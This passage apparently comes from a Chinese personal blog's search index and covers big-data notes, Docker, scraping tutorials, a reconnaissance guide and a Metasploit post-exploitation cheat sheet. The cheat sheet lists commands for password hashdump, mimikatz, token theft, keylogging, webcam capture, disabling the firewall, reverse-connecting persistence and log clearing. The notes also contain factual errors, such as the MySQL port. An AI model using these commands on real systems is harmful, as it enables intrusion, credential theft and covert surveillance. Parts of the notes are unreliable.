命名空间\n- 文档: document --> 数据存储，ES中的检索基本单元\n- 映射: mapping --> 约束字段类型\n\n## ElasticSearch命令使用\n\n```bash\n数据添加/修改: put /索引/_doc/id\n{\n  \"key\":\"value\"\n}\n数据查询: get /索引/_doc/id\n数据删除: delete /索引/_doc/id\n\n```\n\n\n# Redis\n    基于内存的，网络高性能数据库\n- 读取速度快，低延迟\n- 适用于实时场景\n- 可持久化(RDB/AOF)\n- key-value\\\nkey命名:见名知意\\\nvalue:可以存储多样数据\n- 属于NoSQL数据库(存储多样化:图像、视频、音频、数字、文字等)\n\n\n## Redis应用场景\n- 排序类应用\n- 设置过期时间应用\n- 统计计数\n- 消息队列\n- 临时存储\n\n## Redis系统架构\n- `无中心、自组织的集群`: 集群中的所有节点会维护一个集群拓扑\n- 分桶:根据key值计算hash存储进不同的槽中\n- 集群拓扑中维护的就是槽和节点的映射关系\n- `Redis节点只帮助用户重定向，不进行转发`\\\n重定向: Client发出多次请求(`Client分 别请求节点`)\\\n转发: Client只需要请求第一个节点，节点帮助Client向正确的节点发出请求(Client只需要请求第一 台节点)\n  \n## Redis读写流程\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151423308.png?token=ARYCSASCGAE5V24SDVWYL7DCQCOJ6)\n\n\n1. Client向任意一 个节点发出请求，连接到redis\n2. 从redis节点中获取redis集群拓扑，得到key存储的server信息\n3. 可以获取到key对应的槽所在的server信息\n4. 如果做读取，对server发起读请求，如果是写入，就发起写请求\n5. `如果在Client获取拓扑时，数据发生变动，从一个节点迁移到另-一个节点`\n6. 此时Client获取到的是旧的拓扑，向原定的server发起请求\n7. server接收到请求后发现Client要请求的数据已经被迁移,会告诉Client数据被迁移到哪个节点\n8. Client从原server中接收到正确server的反馈信息\n9. 对新server重新发起一-次请求，获取数据响应\n\n## Redis关键特性\n- 支持多数据库\\\n名称不支持自定义，从0开始递增\\\n默认情况下支持1 6个数据库,不做更改的情况下使用的是0号数据库\\\n如果要切换当前使用的数据库: `select 0`\n- 可以通过正则表达式匹配所有符合规则的key值\\\nkeys正则表达式\\\n要查找所有的a开头后面跟数字的所有的key值: `keys a[0-9]*`\n- 判断key是否存在: `exists key`\n- 删除key值: `del key key2`\n- 获取key对应的类型: `type key`\n- `redis中不区分大小写( 单个单词要不就全大写要不就全小写)`\n\n## Redis数据类型及使用\n- String的数字可以作为数值类型使用\n- Hash添加数据时value是键值对(应用于对象数据存储)\n- List可重复的有序集合\\\n操作数据时可以区分左右(前后)查询整个集合中的数据时`lrange key 0 -1`\n- Set不重复无序的集合\\\n可以针对集合计算交集、并集等\n- Sorted Set:有序集合,可以根据给key的分数进行排序\n\n## Redis性能优化\n- 可设置key的生存时间\n- Redis管道(pipeline) --> 管道数据传输速度快于普通传输(仅在Java API中)\n- 数据排序Sort,如果是对集合进行排序Sorted Set\n- Redis持久化(RDB/AOF)\\\nRDB(默认) :使用快照的方式对当前数据进行持久化存储\\\n创建快照的条件(在指定时间内有指定数量的key发生变化): `save 时间s数量`\\\n手动触发: sava、bgsave\\\nsave:使用主进程运行，在创建快照过程中会堵塞其他进程运行\\\nbgsave:划分一个子进程用于执行快照，不会影响其他得到进程运行\\\nAOF:使用的日志文件形式存储信息\\\n可以设定数据发生变更时进行记录\\\n- Redis内存占用情况\\\n相同数据的情况下，32位操作系统比64位所使用的内存更少\\\n100万条简单键值对，占用100M空间，实际占用空间较少，可存储数据量较大\n  \n## Redis的优化\n1. 精简键名值数据:尽可能简单，但是能知意-->`可以节省存储空间`\n2. 在不需要持久化的应用场景中关闭持久化功能\n3. 内部编码优化\n4. SlowLog:记录运行超时命令系统\n5. 修改Linux内核内存分配策略: 1:不需要检验内存情况，可以直接运行任务直到内存使用完为止\n6. 关闭THP:节省资源开销(redis修改时先复制再对复制内容修改)\\\n(THP:如果数据只有200K,使用THP的情况下，这个大页大小约20M\\\n不使用THP时，复制后总大小400K,使用了THP复制后总大小40M)\n7. 修改linux中的tcp最大连接数\n8. 限制Redis使用内存大小\n9. 做多条数据操作时，尽量选择批量操作命令不要通过循环执行\n\n# 安全认证&权限管理Kerberos & Ldap\n    在大数据平台中，统一身份体现在:只要通过用户名和密码成功登陆，就可以操作授`权过的组件`\n    统一用户管理系统:用户及相关权限管理、用户登录后的相关管理等\n\n##  统一身份认证管理系统\n- 管理模块:管理信息存储,管理认证，用户请求\n- 信息存储模块:存储用户信息、权限信息\n- 认证模块:通过用户请求和当前系统存储的用户信息做比对，确认用户是否正确、核查用户权限\n\n## Ldap目录服务系统\n- 目录:加快数据检索速度\n- 轻量级目录访问协议、跟踪协议\n\n## LdapServer系统结构(树状结构)\n- 树状结构中会包含很多节点，每个节点都有自己的名称dn(当前节点及它的所有父节点)\n- 根节点名称是dc,标记为区域\n- 区域的下一级是组织，组织节点名称: ou\n- 组织节点下一级是对象，对象节点名称: cn,存储对象属性\n\n## Ldap功能模块设计\n- 查询类操作\n- 更新类操作\n- 认证类操作\n- 其他操作:放弃服务或者扩展服务\n\n## Ldap集成设计\n- 身份认证架构设计\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151423534.png?token=ARYCSATO5HTD633FH2FZWO3CQCOKS)\n  \n- 身份认证流程设计\n    1. 应用侧提交认证请求\n    2. Thrift Server从Ldap获取相关用户信息\n    3. Thrift Server执行认证比对\n    4. 认证成功后将请求导向响应的应用\n   \n\n\n- 身份认证功能设计\n    可以通过组Group和角色Role的方式给用户赋予权限\\\n    Group:设置组权限，将用户添加到组中\\\n    Role:给角色设定权限，给用户匹配角色\n\n## Kerberos认证处理\n\n- krbServer中的三大核心: Client 、KDC、 KDC Server\n- Client :接收用户请求\n- KDC:生成密钥，发放密钥等\n- KDC Server:提供密钥服务\n\n## Kerberos应用流程\n1. 用户提供用户名和密码给登录认证系统\n2. 登录认证系统通过登录认证后，反馈一个当前用户的用户信息卡 (用户、密码、所授权信息)\n3. 用户获取到用户信息卡之后就可以进入到MRS中.\n4. 在MRS中找到对应的要使用的组件,提交自己的信息卡\n5. 组件对比信息卡查看是否具有当前组件的权限\n6. 用户前往权限授权中心,提交信息卡,权限授权中心根据信息卡对指定组件进行授权(ST)\n7. 用户获取到对应组件的授权信息，可以再次向组件发起请求(信息卡, ST)\n8. 组件接收到请求后再次校验,校验结果没问题的话，用户就可以正常使用组件\n","tags":["HCIA","大数据"],"categories":["笔记"]},{"title":"msf后渗透使用","url":"/2022/04/18/msf后渗透使用/","content":"# msf后渗透命令整理\n\n- 后渗透基本知识\n- 权限维持,权限提升,内网渗透等\n- 内网渗透:信息收集,读取用户hash,浏览器密码等\n- 域渗透:获取域控权限\n\n## 1.后渗透基本操作\n```bash\nbackground\t\t    让meterpreter处于后台\nsessions -i 会话号\t    与会话进行交互\nquit \t\t\t    退出会话\nshell\t\t\t    获取一个交互式shell\nirb\t\t            开启ruby终端\n```\n\n\n## 2.文件操作命令\n```bash\ncat \t\t    查看文件内容\ngetwd\t\t    查看当前工作目录\nupload\t\t    上传文件\ndownload\t    下载文件\nedit\t\t    编辑文件\nsearch\t\t    搜索文件\n```\n\n\n## 3.网络命令\n```bash\nipconfig/ifconfig\t\t查看网络接口信息\nportwd\t\t\t\t端口转发\t本机监听端口\t把目标机端口转到本机端口上\nrdesktop\t\t\t使用rdesktop来连接 -u 用户名 -p 密码\nroute\t\t\t\t获取路由表\n```\n\n\n## 后渗透基本操作\n```bash\nps\t\t\t    查看当前进程\nmigrate pid\t            将meterpreter进程pid移动到指定进程中\nexecute -H -i -f cmd.exe    创建新进程cmd.exe -H不可见\t-i交互\ngetpid\t获                   取当前进程的pid\nkill pid\t            杀死进程\ngetuid\t                    查看当前权限\nsysinfo\t                    查看目标机系统信息\n```\n\n## 后渗透高级操作\n```bash\nrun post/windows/gather/enum_applications \t获取安装软件信息\nrun post/windows/gather/dumplinks \t\t获取最近的文件操作\nrun scraper \t\t\t                获取常见信息\t\nrun post/windows/gather/enum_patches \t        获取补丁信息\nrun post/windows/gather/enum_domain  \t        查找域控\n\nload命令  \nload mimikatz                                   加载mimikatz\nwdigest\t                                        获取用户密码\nload incognito                      加载incognito盗取主机用户令牌假冒用户\n```\n\n\n### 信息收集\n```bash\nrun post/windows/gather/checkvm\t\t检查是否为虚拟机\ncmd下 quser\t\t查看用户是否在线\nidletime\t\t检查受害者闲置了多久\nscreenshot\t        截屏\n```\n\n### 用户口令\n```bash\nhashdump\t获取用户hash\nrun post/windows/gather/smart_hashdump\t获取域的密码\n```\n\n\n### 权限提升\n```bash\n普通用户利用漏洞获取权限\nuse exploit/windows/local/ms18_8120_win32k_privesc\n```\n\n\n### 自动匹配提权模块\n```bash\nuse post/multi/recon/local_exploit_suggester\npost/windows/gather/enum_patches\n```\n\n### 关闭防火墙\n```bash\nnetsh advfirewall set allprofiles state off\n```\n\n\n### 本地提权\n```bash\nsearch local/ms\n```\n\n\n### 绕过UAC\n```bash\nuse exploit/windows/local/bypassuac \nuse exploit/windows/local/bypassuac_injection \nuse windows/local/bypassuac_vbs \nuse windows/local/ask\n```\n\n\n### 获取system权限\n```bash\ngetsystem\n```\n\n### 缓存口令\n```bash\n获取谷歌chrome缓存\nrun post/windows/gather/enum_chrome\n\n获取火狐firfox缓存\nrun post/windows/gather/enum_firefox\n\n获取IE缓存\nrun post/windows/gather/enum_ie\n```\n\n### 键盘记录\n```bash\nkeyscan_start\t开启键盘记录\nkeyscan_dump\t显示捕捉到的记录\nkeyscan_stop\t停止键盘记录\n```\n\n### 域口令获取\n```bash\nsteal_token 试图窃取指定(pid)进程的令牌\nuse incognito\t\t加载incoginto功能(盗取目标主机的令牌或是假冒用户)\nlist_tokens -u\t\t列出目标主机用户的可用令牌\nlist_tokens -g\t\t列出目标主机用户组的可用令牌\n```\n\n### 摄像头信息\n```bash\nrecord_mic\t音频录制\nwebcam_chat\t\t查看摄像头接口\nwebcam_list\t\t查看摄像头列表\nwebcam_stream\t摄像头视频获取\n```\n\n### 后门持久化,权限维持\n``` bash\n1.migrate\nmigrate pid\n可以将meterpreter的当前进程迁移到其他指定进程中,这样做的好处是给后门一个相对稳定的环境,同时可以防止杀软\n\n2.metsvc\nrun metsvc -A\nmeterpreter提供两种方式的后门,一种是通过服务启动(metsvc),一种是通过启动项启动(persistence).\n通过服务(metsvc)启动方式,优点是命令简单方便,不需要设置太多参数.缺点是只要发现了这个后门,所有人都可以连接\n\n3.persistence\nrun persistence -S -U -X -i 5 -p 端口 -r ip\n通过开机启动项启动的方式,缺点是命令参数多比较复杂,可能因为启动项权限原因,导致失败,且并无回显.优点是,因为载入启动项中,所以一般的杀软都会放行,如果在用shellcode做下免杀会更好,当然这是后话\n-A   自动启动一个匹配的exploit / multi / handler来连接到代理\n-L   如果未使用％TEMP％，则在目标主机中写入有效负载的位置。\n-P   有效负载使用，默认为windows / meterpreter / reverse_tcp。\n-S   作为服务自动启动代理程序（具有SYSTEM权限）\n-T   要使用的备用可执行模板\n-U   用户登录时自动启动代理\n-X   系统引导时自动启动代理程序\n-h   这个帮助菜单\n-i   每次连接尝试之间的时间间隔（秒）\n-p   运行Metasploit的系统正在侦听的端口\n-r   运行Metasploit监听连接的系统的IP\n\n4.run vnc(远程控制,类似3389远程桌面)\nrun vnc\n\trun post/windows/manager/enable_rdp\t开启远程桌面\n\n5.getuid(创建一个用户,客户端化)\n常用命令\nrun getuid -e\t\t开启远程桌面\nrun getuid -u name -p password\t\t添加用户\nrun getuid -f\t4446 -e\t将3389端口转发到4446\n```\n### 清除痕迹\n清楚所有日志信息\n```bash\nclearev\t\n```\n\n\n","tags":["kali","渗透"],"categories":["工具使用"]},{"title":"docker基本使用","url":"/2022/04/18/docker基本使用/","content":"## docker帮助命令\n```\ndocker version 显示版本信息\ndocker help 帮助\ndocker info 基本信息\n```\n## docker镜像命令\n```\ndocker images\n# 可选项\n-a, --all   # 列出所有镜像\n-q, --quite # 只显示镜像的id\n```\n\n#### docker search 搜索镜像\n```\n# 可选项\n--filter=STARS=3000 # 搜索星在3000以上的\n```\n\n#### docker pull 下载镜像\n```\n# 下载镜像 docker pull 镜像名 tag\n# 如果不写tag默认就是最新版\n```\n\n#### 删除容器\n```\ndocker rm -f id # 删除指定容器\ndocker rm -f $(docker images -qa) # 删除所有容器\n```\n\n\n\n## docker容器命令\n\n**新建容器并启动**\n```\n--name = \"名字\" # 给容器起一个名字\n-d            # 后台方式运行\n-it           # 使用交互式方式运行\n-P            # 指定容器的端口\n    1.ip:主机端口:容器端口\n    2.主机端口:容器端口(常用)\n    3.容器端口\n-p            # 随机端口\n```\n\n**使用**\n```\nchenci@MacBook-Pro ~ %docker run -it centos /bin/bash\n\n退出\nexit\n```\n\n**查看运行的容器**\n```\ndocker ps \n# -a 历史运行过的容器\n# -n=? 显示最近创建的容器\n# -q 只显示容器的编号\n```\n\n**启动和停止容器**\n```\ndocker start id #启动容器\ndocker restart id #重启容器\ndocker stop id #停止当前正在运行的容器\ndocker kill id #强制停止当前容器\n```\n\n**查看日志**\n```\ndocker logs -tf --tail 日志条数 id\n```\n\n**查看镜像元数据**\n```\ndocker inspect id\n```\n\n**进入正在运行的容器**\n```\n# 方法一\ndocker attach id # 进入容器正在执行的终端\n\n#方法二\ndocker exec -it id bashshell #进入容器后开启新的终端\n```\n\n**从容器拷贝文件到主机**\n```\ndocker cp id:容器内路径 目标主机路径\n```\n\n## 实例-安装nginx\n```\n1.搜索镜像\ndocker search nginx\n\n2.拉取镜像\ndocker pull nginx\n\n3.启动并映射到本地3344端口\ndocker run -d --name nginx01 -p 3344:80 nginx\n\n4.测试\ncurl localhost:3344\n\n5.进入容器\ndocker exec -it nginx01 /bin/bash\n```\n\n## 实例-安装tomcat\n```\n1.拉取镜像\n官方版\ndocker run -it --rm tomcat:9.0 #没有此镜像就会去自动下载,--rm退出后就删除镜像,一般用于测试\n\n1.拉取镜像\ndocker -pull tamcat\n\n2.启动并映射\ndocker run -d -p 3355:8080 --name tomcat01 tomcat\n\n3.测试访问,发现404\ncurl localhost:3355\n\n4.进入容器\ndocker exec -it tomcat01 /bin/bash\n\n5.拷贝\ncp -r webapps.dist/* webapps/\n```\n\n\n## commit镜像\n```shell\ndocker commit 提交容器成为一个新的副本\n\n#与git相似\ndocker commit -m='提交的描述信息' -a='作者' 容器id 目标镜像名:[tag]\n\n#1.利用原来的tomcat制作一个新镜像\ndocker commit -a='chenci' -m='add webapps' id tomcat02:1.0\n\n```\n\n## 容器数据卷\n```shell\n为了容器的持久化和同步操作\n```\n**使用数据卷**\n```shell\n挂载\ndocker run -it -v 主机目录:容器目录\n```\n**测试同步mysql**\n```shell\n#1.启动并映射端口,设置密码\ndocker run -d -p 3310:3306 -v /Users/chenci/guazai/mysql:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name some-mysql mysql:5.7\n\n#2.远程连接\nmysql -uroot -p123456 -h 10.30.3.100 -P 3310\n\n#3.在远程连接中创建数据库测试\n测试无误,本地和容器中都会多一个测试数据库\n```\n**具名和匿名挂载**\n```shell\n#只写了容器内的路径,就是匿名挂载\ndocker run -it -P --name nginx -V /path id\n#查看\nlocal     6c71f963cc89b24d16b4b47cb35df42445ff9d9395753b192ba72cbbbc22d583\n\n\n#写了名字就是具名挂载\ndocker run -it -P --name nginx -V juming /path id\n#查看\nlocal     juming\n\n\n#查看所有的volume\ndocker volume ls\n\n#查看卷\ndocker volume inspect juming\n\n```\n**`通过具名可以方便找到一个卷通所以一般使用具名挂载`**\n```shell\n-v 容器内路径 #匿名挂载\n-v 卷名:容器内路径 #匿名挂载\n```\n**`扩展`**\n```shell\n#在路径后面跟:ro或则rw\nro表示这个路径只能通过宿主机来操作,容器内部无法操作\n```\n\n","tags":["教程","docker"],"categories":["工具使用"]},{"title":"信息收集","url":"/2022/04/17/信息收集/","content":"\n# 信息收集流程框架\n    web安全的本质是信息收集,信息收集的广度决定了渗透测试的深度\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151406722.png?token=ARYCSAQD6OKJD27QWBHELEDCQCML2)\n\n# google hacking\n利用谷歌强大的搜索引擎,经常会有意想不到的的收获\n\n## 基本的搜索\n- 逻辑与 and\n- 逻辑或 or\n- 逻辑非 \n- 通配符 *\n\n## 应用\nintext寻找网页正文中的关键字,如: intext后台登录\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151407831.png?token=ARYCSAWV4LKDZRPCSEVF6JTCQCMMU)\n\nintitle寻找网页标题中的关键字,如: intitle\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151407472.png?token=ARYCSARBOVPDEZB5OZMIVK3CQCMNG)\n\nallintitle用法和intitle差不多,差别在于可指定多个关键字\ninurl返回url中含有关键字的网页,如: inurl:login\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151407166.png?token=ARYCSAQ3SFZMMU3UYVUJCGLCQCMOQ)\n\n查找管理员登录界面\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151407174.png?token=ARYCSAQOLC655DBNNP7VXPLCQCMPK)\n\n\n查找phpmyadmin\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151408516.png?token=ARYCSASH2YTTZCBNY6FPUJDCQCMQG)\n\nallinurl和inurl的用法差不多,差别在于可指定多个关键字\nsite指定访问的网站,如,site:baidu.com inurl:login\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151408454.png?token=ARYCSARRLHPP2UJ4SQO2VWLCQCMQY)\n\n## 查找网站后台\n\n- site:xx.com intext:管理\n- site:xx.com inurl:login\n- site:xx.com intitle:后台\n\n## 查看服务器使用的程序\n\n- site:xx.com filetype:asp\n- site:xx.com filetype:php\n- site:xx.com filetype:jsp\n- site:xx.com filetype:aspx\n\n## 查看上传漏洞\n- site:xx.com inurl:file\n- site:xx.com inurl:load\n\n# dns域名信息\n首先是对应域名的ip,域名注册人,邮箱,dns,子域名之类的信息\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151408552.png?token=ARYCSAXOYDDMLZE6YSW4UZLCQCMRI)\n\n## whois查询\n- 然后判断是否有cdn\thttp://cdn.chinaz.com\n- 也可以使用不同地区的电脑ping,看ip是否是同一个\n- 如果查询出的ip有多个就说明使用了cdn\n\n## CDN查询\n- 绕过cdn查询真实ip https://x.threatbook.cn/ 微步\n\n# 整站分析\n服务器类型\n- 服务器平台,版本等\n网站容器\n- 搭建网站的服务组件,如:iis,apache,nginx等等\n脚本类型\n- 常见的有asp,php,jsp,aspx\n数据库类型\n- 常见的有access,sqlserver,mysql,oracle\ncms类型\n- 网站模板\nwaf\n- 安全防护软件\n\n## 服务器类型(windows/linux)\n- nmap 扫描\n- google抓包分析\n\n## 网站容器(iis,apache,nginx)\n知道网站容器很重要,如iis6.0的解析漏洞,ngixn<0.83的解析漏洞.,iis7.0的畸形解析漏洞等等\n- nmap 扫描\n- google抓包分析\n\n## 脚本类型(php,jsp,asp,aspx等)\n- 根据网站的url\n- 直接打开一个展示页面查看\n- 根据firefox的插件查看\n\n## 数据库类型\n- mysql端口为3389,数据库后缀名.sql\n- sqlserver端口为1433,数据库后缀名.mdf\n- access后缀名为.mdb\n- oraacle,端口为1521\n\n一般的常见搭配为\n\n- ASP和ASPX:access,sqlserver\n- PHP:mysql\n- JSP:oracle,mysql\n\n## 端口扫描\n扫描目标开放了哪些端口,如常见的135,137,445经常爆发出漏洞\n- 21,22,23,3389\tftp,ssh,telnet,windows远程桌面\n- 873 rsync 未授权访问漏洞\n- 3306 mysql 弱口令\n- 6379 redis未授权访问漏洞\n\n## 网站敏感目录和文件\n- 后台目录:万能密码,弱口令,爆破\n- 安装包:获取数据库信息,甚至是网站源码\n- 上传目录:上传木马,一句话等\n- mysql管理接口:爆破,弱口令,万能密码,甚至能直接拿shell\n- phpinfo:暴露各种配置信息\n- 编辑器:各种畸形漏洞\n- robots.txt\n\n## 旁站和C段\n- 旁站指的是同一服务器上得不同网站,如果你拿不下这个网站,不如试试旁站.拿下旁站webshell,再提权也就拿下了这个网站了\n\n- C段指的是同一网段的其他服务器,192.168.0.1,0就是C段.如果拿下了C段中一台服务器,就可使用嗅探工具,arp欺骗等劫持流量,找到关键信息,拿下服务器\n\n- 旁站查询:http://s.tool.chinaz.com/same\n\n- C段查询:http://www.webscan.cc/\n\n","tags":["web安全","信息收集"],"categories":["笔记"]},{"title":"异步协程爬取福利姬","url":"/2022/04/14/异步爬取某涩情网站图片/","content":"\n\n```python\n# -*- coding: utf-8 -*-\n\"\"\"\n-------------------------------------------------\n   File Name：     协程4-实战爬取tuao8.com\n   Author :       chenci\n   date：          2022/3/25\n-------------------------------------------------\n\"\"\"\nimport aiofiles\nimport requests\nfrom lxml import etree\nimport asyncio\nimport aiohttp\nfrom fake_useragent import UserAgent\nimport os\nimport time\n\ndef create_dir_not_exist(path):\n    if not os.path.exists(path):\n        os.makedirs(path)\n\n\n# 抓取每个条目的图集\ndef get_photos_url():\n    resp = requests.get(url='https://www.tuao8.xyz/category-2_1.html', headers=header)\n    text = etree.HTML(resp.text)\n    href_url_list = text.xpath('//*[@id=\"container\"]/main/article/div/a/@href')\n    return href_url_list\n\n\n# 去请求每个图集.返回源码\nasync def get_photos(photo_list):\n    # 限制并发熟路默认100,0为无限制\n    conn = aiohttp.TCPConnector(limit=10)\n    # 发送请求\n    async with aiohttp.ClientSession(connector=conn) as session:\n        async with await session.get(url=photo_list, headers=header) as resp:\n            page_text = await resp.text()\n            await get_photos_title_page(page_text, photo_list)\n\n\n# 从每个源码里筛选出标题和最大页码,url\nasync def get_photos_title_page(text, url):\n    tasks = []\n    html = etree.HTML(text)\n    title = html.xpath('//*[@id=\"container\"]/main/article/h1/text()')[0]\n    max_page = int(html.xpath('//*[@id=\"dm-fy\"]/li[last()-1]/a/text()')[0])\n    create_dir_not_exist(f'./imgs/tuzo_xc/{title}')\n    task = asyncio.create_task(get_download_url(url=url, title=title, max_page=max_page))\n    tasks.append(task)\n    await asyncio.wait(tasks)\n\n\n# 获取每一页的url并从源码中筛选出每张图片的下载链接\nasync def get_download_url(url, title, max_page):\n    tasks = []\n    for i in range(1, max_page):\n        urls = f'{url}?page={i}'\n        conn = aiohttp.TCPConnector(limit=10)\n        async with aiohttp.ClientSession(connector=conn) as session:\n            async with await session.get(url=urls, headers=header) as resp:\n                page_text = await resp.text()\n                html = etree.HTML(page_text)\n                image_url = html.xpath('//*[@class=\"entry\"]//img/@src')[0]\n                task = asyncio.create_task(download_image(image_url, title, i))\n                tasks.append(task)\n    await asyncio.wait(tasks)\n\n\n# 下载\nasync def download_image(image_url, title, i):\n    conn = aiohttp.TCPConnector(limit=30)\n    async with aiohttp.ClientSession(connector=conn) as session:\n        try:\n            async with await session.get(url=image_url, headers=header) as resp:\n                print(image_url)\n                async with aiofiles.open(f'./imgs/{title}/{i}.jpg', 'wb') as f:\n                    print(f'正在下载{title}  第{i}张')\n                    await f.write(await resp.read())\n        except:\n            pass\n        print('下载完成')\n\n\nasync def main():\n    href_url_list = get_photos_url()\n    tasks = []\n    for url in href_url_list:\n        task = asyncio.create_task(get_photos(photo_list=url))\n        tasks.append(task)\n    await asyncio.wait(tasks)\n\n\nif __name__ == '__main__':\n    start = time.time()\n    ua = UserAgent()\n    header = {\n        'Referer': 'https://www.tuao8.xyz/category-2_2.html',\n        'user-agent': ua.random\n    }\n    asyncio.run(main())\n    end = time.time()\n    print('全部下载完成!耗时:', int(end - start), '秒')\n\n\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151424766.png?token=ARYCSASWHOWU3BBPK4JWMATCQCOMA)\n","tags":["requests","异步"],"categories":["爬虫"]},{"title":"scrapy框架学习","url":"/2022/04/08/scrapy框架学习/","content":"\n## 创建项目\n\n```bash\nscrapy startproject tutorial\n```\n\n## 创建任务\n\n```bash\nscrapy genspider first www.baidu.com\n```\n\n会生成一个first文件\n\n```python\nimport scrapy\n\n\nclass FirstSpider(scrapy.Spider):\n    # 唯一标识符\n    name = 'first'\n    # 允许的域名\n    allowed_domains = ['www.baidu.com']\n    # 起始的url,默认发送get请求\n    start_urls = ['https://www.baidu.com/']\n\n    # 数据解析\n    def parse(self, response):\n        pass\n```\n\n## 修改配置文件\n\n只输出ERROR级别的日志\n\n```python\n# 只输出ERROR级别的日志\nLOG_LEVEL = 'ERROR'\n```\n\n不遵从robots协议\n\n```python\nROBOTSTXT_OBEY = False  \n```\n\n指定ua\n\n```python\nUSER_AGENT = 'tutorial (+http://www.yourdomain.com)'\n```\n\n## 运行程序\n\n```bash\nscrapy crawl first\n```\n\n会输出一个response对象\n\n```\n<200 https://www.baidu.com/>\n```\n\n## 数据解析\n\n```python\nimport scrapy\n\n\nclass FirstSpider(scrapy.Spider):\n    name = 'first'\n    start_urls = ['https://ishuo.cn/']\n\n    def parse(self, response):\n        # 返回一个selector对象\n        title_list = response.xpath('//*[@id=\"list\"]/ul/li/div[1]/text()')\n        for title in title_list:\n            print(title)\n\n```\n\n可以看到返回了一个selector对象,我们想要的数据在data属性里\n\n```bash\nchenci@MacBook-Pro tutorial %scrapy crawl first\n<Selector xpath='//*[@id=\"list\"]/ul/li/div[1]/text()' data='如果你得罪了老板，失去的只是一份工作；如果你得罪了客户，失去的不过是一份订...'>\n<Selector xpath='//*[@id=\"list\"]/ul/li/div[1]/text()' data='有位非常漂亮的女同事，有天起晚了没有时间化妆便急忙冲到公司。结果那天她被记...'>\n<Selector xpath='//*[@id=\"list\"]/ul/li/div[1]/text()' data='悟空和唐僧一起上某卫视非诚勿扰,悟空上台,24盏灯全灭。理由:1.没房没车...'>\n```\n\n从data属性中取出我们想要的数据\n\n```python\nimport scrapy\n\n\nclass FirstSpider(scrapy.Spider):\n    name = 'first'\n    start_urls = ['https://ishuo.cn/']\n\n    def parse(self, response):\n        # 返回一个selector对象\n        title_list = response.xpath('//*[@id=\"list\"]/ul/li/div[1]/text()')\n        for title in title_list:\n            # 取出数据\n            title = title.extract()  # extract_first()取第一个\n            print(title)\n\n```\n\n## 持久化存储\n\n### 1.基于终端指令的存储\n\n```python\nimport scrapy\n\n\nclass FirstSpider(scrapy.Spider):\n    name = 'first'\n    start_urls = ['https://ishuo.cn/']\n\n    def parse(self, response):\n        data_all = []\n        # 返回一个selector对象\n        title_list = response.xpath('//*[@id=\"list\"]/ul/li/div[1]/text()')\n        for title in title_list:\n            # 取出数据\n            title = title.extract()  # extract_first()取第一个\n            # 构造字典\n            dic = {\n                'title': title\n            }\n            data_all.append(dic)\n        # 返回一个列表\n        return data_all\n```\n\n执行\n\n```bash\nchenci@MacBook-Pro tutorial %scrapy crawl first -o test.csv\n```\n\n### 2.基于管道的持久化存储\n\n开启管道\n\nsettings.py\n\n```python\nITEM_PIPELINES = {\n    'tutorial.pipelines.TutorialPipeline': 300,  # 300表示优先级,越小优先级越高\n}\n```\n\n在items.py中定义相关属性\n\n```python\nimport scrapy\n\n\nclass TutorialItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    # Field定义好的属性当做万能属性\n    title = scrapy.Field()\n\n```\n\n将first.py提取出的数据提交给管道\n\n```python\nimport scrapy\nfrom tutorial.items import TutorialItem\n\n\nclass FirstSpider(scrapy.Spider):\n    name = 'first'\n    start_urls = ['https://ishuo.cn/']\n\n    def parse(self, response):\n        # 返回一个selector对象\n        title_list = response.xpath('//*[@id=\"list\"]/ul/li/div[1]/text()')\n        for title in title_list:\n            # 取出数据\n            title = title.extract()  # extract_first()取第一个\n\n            # 实例化一个item对象,将解析到的数据存入到该对象\n            item = TutorialItem()\n            # 通过字典的方式调用\n            item['title'] = title\n            # 将item对象提交给管道\n            yield item\n\n```\n\n在pipelines.py中重写父类方法,存储到本地\n\n```python\nclass TutorialPipeline:\n    # 重写父类方法\n    f = None\n\n    def open_spider(self, spider):\n        print('我是open_spider,只会在爬虫开始的时候执行一次')\n        self.f = open('./text1.txt', 'w', encoding='utf-8')\n\n    def close_spider(self, spider):\n        print('我是close_spider,只会在爬虫开始的时候执行一次')\n        self.f.close()\n\n    # 该方法是用来接收item对象的,一次只能接收一个item,说明该方法会被多次调用\n    # 参数item就是接收的item对象\n    def process_item(self, item, spider):\n        # 存储到本地文件\n        self.f.write(item['title'] + '\\n')\n        return item\n```\n\n基于管道实现数据的备份\n\npipelines.py\n\n```python\nimport pymysql\n\n\nclass MysqlPipeline(object):\n    conn = None\n    cursor = None\n\n    # 重写父类\n    def open_spider(self, spider):\n        # 数据库连接对象\n        self.conn = pymysql.Connect(host='localhost', port=3306, user='root', password='123456', charset='utf8',\n                                    db='spider')\n\n    def process_item(self, item, spider):\n        self.cursor = self.conn.cursor()\n        sql = 'insert into duanzi values(\"%s\")' % item['title']\n        # 事务处理\n        try:\n            self.cursor.execute(sql)\n            self.conn.commit()\n        except Exception as e:\n            print(e)\n            self.conn.rollback()\n        # 返回item会给下一个管道使用,如果不返回,下一个管道将接收不到\n        return item\n\n    # 重写父类,关闭连接\n    def close_spider(self, spider):\n        self.cursor.close()\n        self.conn.close()\n\n```\n\n在settings.py增加一个管道\n\n```python\nITEM_PIPELINES = {\n    # 爬虫文件中的item只会提交给优先级最高的那一个管道类\n    'tutorial.pipelines.TutorialPipeline': 300,\n    'tutorial.pipelines.MysqlPipeline': 301,\n}\n```\n\n## 手动请求发送\n\n新建工程\n\n```bash\nchenci@MacBook-Pro scrapy %scrapy startproject HandReq\nchenci@MacBook-Pro scrapy %cd HandReq \nchenci@MacBook-Pro HandReq %scrapy genspider duanzi www.xxx.com\n```\n\n```python\nimport scrapy\nfrom HandReq.items import HandreqItem\n\n\nclass DuanziSpider(scrapy.Spider):\n    name = 'duanzi'\n    # allowed_domains = ['www.xxx.com']\n    start_urls = ['https://duanzixing.com/page/1/']\n\n    # 通用的url模板\n    url = 'https://duanzixing.com/page/%d/'\n    page_num 